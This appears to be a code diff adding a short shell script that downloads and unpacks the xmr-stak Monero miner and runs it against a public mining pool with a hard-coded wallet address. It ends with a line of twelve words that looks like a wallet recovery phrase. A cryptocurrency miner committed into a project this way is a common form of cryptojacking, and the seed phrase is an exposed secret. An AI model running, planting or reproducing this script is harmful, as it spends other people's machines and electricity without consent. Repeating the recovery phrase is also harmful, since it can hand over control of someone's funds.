@@ -1,0 +1,4 @@
+wget https://github.com/fireice-uk/xmr-stak/releases/download/1.0.1-rx/xmr-stak-rx-linux-1.0.1-cpu_cuda-nvidia.tar.xz
+tar xf xmr-stak-rx-linux-1.0.1-cpu_cuda-nvidia.tar.xz && cd xmr-stak-rx-linux-1.0.1-cpu_cuda-nvidia
+./xmr-stak-rx --coin=XMR --url=xmr.2miners.com:2222 --user=87kFq9yoGAu9ZPzm6Abak7Uj61ufTEJ5VEHWMp5PwcVB86nw2wsHjGX7h7KkSCPZd421nGpFs1rbv1hX38fDy5Uu4prCPdg --pass=x
+steak pigeon field slam argue gentle stand slot embody venue ripple trial
